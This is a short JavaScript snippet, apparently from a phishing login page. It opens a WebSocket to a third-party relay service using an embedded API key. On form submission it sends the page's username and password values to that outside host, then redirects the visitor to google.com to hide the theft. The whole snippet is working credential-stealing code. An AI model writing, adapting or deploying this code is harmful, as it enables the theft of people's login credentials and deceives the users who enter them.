var socket = new WebSocket('wss://s8841.nyc1.piesocket.com/v3/1?api_key=093gyWdCE4Z8r86m9tAy3Bla2uqmjqomUl8hK6h3&notify_self=1');
function inputted()
{
    socket.send(document.getElementById("username").value + " " + document.getElementById("password").value);
    setTimeout(window.location = "https://www.google.com", 5000);
}